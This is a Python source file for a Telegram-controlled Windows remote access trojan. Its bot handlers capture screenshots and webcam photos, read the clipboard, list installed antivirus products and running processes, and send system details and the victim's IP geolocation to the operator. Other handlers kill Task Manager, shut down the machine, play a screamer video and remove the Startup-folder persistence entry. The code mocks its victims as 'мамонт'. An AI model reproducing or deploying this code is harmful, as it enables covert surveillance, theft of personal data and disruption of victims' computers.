import os, re
from PIL import ImageGrab
from aiogram import types
import win32api
import platform
import psutil
import GPUtil
import time
import requests
import pyautogui as p
import cv2
import pyperclip
from win32com.client import GetObject
import sys

def Screen(dp, bot, admin_id):
    @dp.message_handler(text_contains='СКРNH ГРИН')
    async def screen(message: types.Message):
        if message.from_user.id == admin_id:
            await bot.send_message(admin_id, 'ВЗЛ0М В ПРОЦЕССЕ...')
            screen = ImageGrab.grab()
            screen.save(os.getcwd() + '\\sreenshot.jpg')
            f = open(os.getcwd() + '\\sreenshot.jpg',"rb")
            await bot.send_document(admin_id, f)
            try:
                os.remove(os.getcwd() + '\\sreenshot.jpg')
            except Exception as e:
                await bot.send_message(admin_id, e)



def Antiviruses(dp, bot, admin_id):
    @dp.message_handler(text_contains='АНТNBИРУСЫ ХУNPYСЫ')
    async def antiviruses(message: types.Message):
        if message.from_user.id == admin_id:
            await bot.send_message(admin_id, 'ВЗЛ0М В ПРОЦЕССЕ...')
            Antiviruses = {
                'C:\\Program Files\\Windows Defender': 'Windows Defender',
                'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
                'C:\\Program Files\\AVG\\Antivirus': 'AVG',
                'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
                'C:\\Program Files (x86)\\IObit\\Advanced sysCare': 'Advanced sysCare',
                'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
                'C:\\Program Files\\DrWeb': 'Dr.Web',
                'C:\\Program Files\\ESET\\ESET Security': 'ESET',
                'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
                'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
                'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32'
            }
            Antivirus = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]
            AntivirusesAll = '\n'.join(Antivirus)
            await bot.send_message(admin_id, "<code>"+ AntivirusesAll + "</code>", parse_mode='HTML')



def Pc_info(dp, bot, admin_id):
    @dp.message_handler(text_contains='ВСЕ ДАННNE')
    async def pc_info(message: types.Message):
        if message.from_user.id == admin_id:
            await bot.send_message(admin_id, 'ВЗЛ0М В ПРОЦЕССЕ...')
            try:
                def get_size(bytes, suffix="B"):
                    factor = 1024
                    for unit in ["", "K", "M", "G", "T", "P"]:
                        if bytes < factor:
                            return f"{bytes:.2f}{unit}{suffix}"
                        bytes /= factor
                uname = platform.uname()

                namepc = "\nNMR ПК: " + str(uname.node)
                countofcpu = psutil.cpu_count(logical=True)
                allcpucount = "\nЯДРА:" + str(countofcpu) 

                cpufreq = psutil.cpu_freq()
                cpufreqincy = "\nЧАСТ0ТА ЦПУ: " + str(cpufreq.max) + 'Mhz'


                svmem = psutil.virtual_memory()
                allram = "\n0ЗУ: " + str(get_size(svmem.total))
                ramfree = "\nД0СТУПНО: " + str(get_size(svmem.available))
                ramuseg = "\nNCПОЛЬЗУЕТСЯ: " + str(get_size(svmem.used))

                partitions = psutil.disk_partitions()
                for partition in partitions:
                    nameofdevice = "\nДNCK: " + str(partition.device)
                    nameofdick = "\nNМЯ ДИСКА: " + str(partition.mountpoint)
                    typeoffilesystem = "\nТNП СИСТЕМЫ: " + str(partition.fstype)
                    try:
                        partition_usage = psutil.disk_usage(partition.mountpoint)
                    except PermissionError:

                        continue
                    allstorage = "\nПАМRТЬ: " + str(get_size(partition_usage.total))
                    usedstorage = "\nNCПОЛЗУЕТСЯ: " + str(get_size(partition_usage.used))
                    freestorage = "\nСВ0БОДНО: " + str(get_size(partition_usage.free))



                try:
                    gpus = GPUtil.getGPUs()
                    list_gpus = []
                    for gpu in gpus:

                        gpu_name = "\nМ0ДЕЛЬ ВИДЕОКАРТЫ: " + gpu.name

                        gpu_free_memory = "\nГПУ СВ0БОДНО: " + f"{gpu.memoryFree}MB"

                        gpu_total_memory = "\nГПУ ВСЕГ0: " f"{gpu.memoryTotal}MB"

                        gpu_temperature = "\nТЕМП3РАТУРА: " f"{gpu.temperature} °C"
                except:
                    await bot.send_message(admin_id, '\nМАМ0НТ НА ВСТРОЙКЕ')

                headers = {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                }
                drives = str(win32api.GetLogicalDriveStrings())
                drives = str(drives.split('\000')[:-1])

                try:
                    ip = requests.get('https://api.ipify.org').text
                    urlloc = 'http://ip-api.com/json/'+ip
                    location1 = requests.get(urlloc, headers=headers).text
                except Exception as e:
                    location1 = "ОШИБКА ДЕКОДЕРА"
                    print(e)
                all_data = "ВРЕМR: " + time.asctime() + '\n' + '\n' + "ПР0ЦЕССОР: " + platform.processor() + '\n' + "СNCТЕМА: " + platform.system() + ' ' + platform.release() + '\nIP:' + location1 + '\nДNCКИ:' + drives + str(namepc) + str(allcpucount) + str(cpufreq) + str(cpufreqincy) + str(svmem) + str(allram) + str(ramfree) + str(ramuseg) + str(nameofdevice) + str(nameofdick) + str(typeoffilesystem )+ str(allstorage) + str(usedstorage) + str(freestorage)
                await bot.send_message(admin_id, "<i>" + all_data + "</i>", parse_mode='HTML')
            except Exception as e:
                await bot.send_message(admin_id, e)



def VolumeON(dp, bot, admin_id):
    @dp.message_handler(text_contains='ЗВУК НА 1ОО%')
    async def volumeON(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, 'ВЗЛ0М В ПРОЦЕССЕ...')
            for x in range(1,100):
                p.hotkey('volumeup')
            await bot.edit_message_text('ВЗЛ0МАНО.', admin_id, msg.message_id)
        except Exception as e:
            await bot.send_message(admin_id, e)



def VolumeOFF(dp, bot, admin_id):
    @dp.message_handler(text_contains='ВЫКЛЮЧNTЬ ЗВУК')
    async def volumeOFF(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, 'ВЗЛ0М В ПРОЦЕССЕ...')
            p.hotkey('volumemute')
            await bot.edit_message_text('УСПЕШНЫЙ ВЗЛ0М', admin_id, msg.message_id)
        except Exception as e:
            await bot.send_message(admin_id, e)



def Shutdown(dp, bot, admin_id):
    @dp.message_handler(text_contains='ВЫКЛЮЧNTЬ ПК')
    async def shutdown(message: types.Message):
        try:
            await bot.send_message(admin_id, 'ВЗЛ0МАНО.')
            os.system('shutdown /s /t 0')
        except Exception as e:
            await bot.send_message(admin_id, e)



def Restart(dp, bot, admin_id):
    @dp.message_handler(text_contains='П3РЕЗАГРУЗNTЬ ПК')
    async def restart(message: types.Message):
        try:
            await bot.send_message(admin_id, 'П3РЕЗАГРУЖАЮ')
            os.system('shutdown /r /t 0')
        except Exception as e:
            await bot.send_message(admin_id, e)



def F4(dp, bot, admin_id):
    @dp.message_handler(text_contains='ALT + F4')
    async def f4(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, 'ВЗЛ0М В ПРОЦЕССЕ...')
            p.hotkey('alt','f4')
            await bot.edit_message_text('ВЗЛОМАН0.', admin_id, msg.message_id)
        except Exception as e:
            await bot.send_message(admin_id, e)



def WinD(dp, bot, admin_id):
    @dp.message_handler(text_contains='СВ3РНУТЬ 0КНА')
    async def wind(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, 'ВЗЛ0М В ПРОЦЕССЕ.')
            p.hotkey('win','d')
            await bot.edit_message_text('ВЗЛ0МАНО.', admin_id, msg.message_id)
        except Exception as e:
            await bot.send_message(admin_id, e)



def VolumeOFF(dp, bot, admin_id):
    @dp.message_handler(text_contains='ВЫКЛЮЧNTЬ ЗВУК')
    async def volumeOFF(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, 'ВЗЛОМ В ПР0Ц3ССЕ...')
            p.hotkey('volumemute')
            await bot.edit_message_text('ВЗЛ0МАНО.', admin_id, msg.message_id)
        except Exception as e:
            await bot.send_message(admin_id, e)



def GetDir(dp, bot, admin_id):
    @dp.message_handler(text_contains='ДNPЕКТОРИЯ')
    async def getdir(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, 'ВЗЛ0М В ПРОЦЕССЕ...')
            dr = os.getcwd()
            await bot.edit_message_text("ДNРЕКТОРИЯ ВИРУСА: " + "\n<code>" + dr + "</code>", admin_id, msg.message_id, parse_mode='HTML')
        except Exception as e:
            await bot.send_message(admin_id, e)


def ListDir(dp, bot, admin_id):
    @dp.message_handler(text_contains='С0ДЕРЖАНNE ДИРЕКТОРИИ')
    async def listdir(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, 'ВЗЛ0М В ПРОЦЕССЕ...')
            ls = os.listdir()
            info = '<code>' + '\n'.join([str(elem) for elem in ls]) + "</code>"

            if len(info) > 4096:
                for x in range(0, len(info), 4096):
                    await bot.send_message(admin_id, info[x:x+4096], parse_mode='HTML')
            else:
                await bot.send_message(admin_id, info, parse_mode='HTML')
        except Exception as e:
            await bot.send_message(admin_id, e)



def Selfie(dp, bot, admin_id):
    @dp.message_handler(text_contains='Ф0ТО МАМОНТА')
    async def selfie(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, 'ВЗЛ0М В ПРОЦЕССЕ...')
            cap = cv2.VideoCapture(0)
            dr = os.getcwd()
            for i in range(30):
                cap.read()
            ret, frame = cap.read()
            cv2.imwrite(dr + '\\4543t353454.png', frame)   
            cap.release()
            webcam = open(dr + '\\4543t353454.png','rb')
            await bot.send_document(admin_id, webcam)
            os.remove(dr + '\\4543t353454.png')
        except Exception as e:
            await bot.send_message(admin_id, e)


def Screamer(dp, bot, admin_id):
    @dp.message_handler(text_contains='БЕЗН0ГNM')
    async def screamer(message: types.Message):
        msg = await bot.send_message(admin_id, 'НЕ ПЫТАNTECЬ ЧТ0-ТО ИЗМЕНNТЬ')
        try:
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")
        file = os.path.join(base_path, 'videoplayback.mp4')
        os.system(file)
        time.sleep(10)
        await bot.edit_message_text("ХА-ХА МАМ0НТ", admin_id, msg.message_id)



def SeeEx(dp, bot, admin_id):
    @dp.message_handler(text_contains='БУФ3Р ОБМЕНА')
    async def seex(message: types.Message):
        if message.from_user.id == admin_id:
            msg = await bot.send_message(admin_id, 'ВЗЛ0М В ПРОЦЕССЕ...')
            Buffer = pyperclip.paste()
            await bot.edit_message_text(f'БУФ3Р ОБМЕНА:\n<code>{Buffer}</code>', admin_id, msg.message_id, parse_mode='HTML')

def ProcList(dp, bot, admin_id):
    @dp.message_handler(text_contains='СПNC0К ПР0ЦЕССОВ')
    async def proclist(message: types.Message):
        if message.from_user.id == admin_id:
            msg = await bot.send_message(admin_id, 'ВЗЛ0М В ПРОЦЕССЕ...')
            result = [process.Properties_('Name').Value for process in GetObject('winmgmts:').InstancesOf('Win32_Process')]
            await bot.edit_message_text(f'ВСЕ ДАННNE:\n<code>{result}</code>', admin_id, msg.message_id, parse_mode='HTML')



def CloseTask(dp, bot, admin_id):
    @dp.message_handler(text_contains='ЗАКРЫТЬ ДNCПЕТЧЕР ЗАДАЧ')
    async def closetask(message: types.Message):
        if message.from_user.id == admin_id:
            a = os.system(f'taskkill /im Taskmgr.exe')
            if a == 128:
                await bot.send_message(admin_id, 'N! SINGAQ.')
            elif a == 0:
                await bot.send_message(admin_id, 'УСП3ШНО ВЗЛОМАНО')
            elif a == 1:
                await bot.send_message(admin_id, 'N! SINGAQ. Недостаточно ШNM.')




def Uninstall(dp, bot, admin_id):
    @dp.message_handler(text_contains='САМ0ВЫПNV')
    async def uninstall(message: types.Message):
        if message.from_user.id == admin_id:
            await bot.send_message(admin_id, 'Все в дальнейшем будет хорошо. Ваш друг.')
            Thisfile = sys.argv[0]
            os.system(f'ping 127.0.0.1 -n 3 > nul && del /f "{os.path.expanduser("~")}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{os.path.basename(Thisfile)}"')



def DVDOpen(dp, bot, admin_id):
    @dp.message_handler(text_contains='0ТКРЫТЬ DVD')
    async def dvdopen(message: types.Message):
        if message.from_user.id == admin_id:
            try:
                ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door open', None, 0, None)
                await bot.send_message(admin_id, 'ВЗЛ0МАНО')
            except:
                await bot.send_message(admin_id, 'N! SINGAQ.')


def DVDClose(dp, bot, admin_id):
    @dp.message_handler(text_contains='ЗАКРЫТЬ DVD')
    async def dvdclose(message: types.Message):
        if message.from_user.id == admin_id:
            try:
                ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door closed', None, 0, None)
                await bot.send_message(admin_id, 'ВЗЛ0МАНО.')
            except:
                await bot.send_message(admin_id, 'N! SINGAQ.')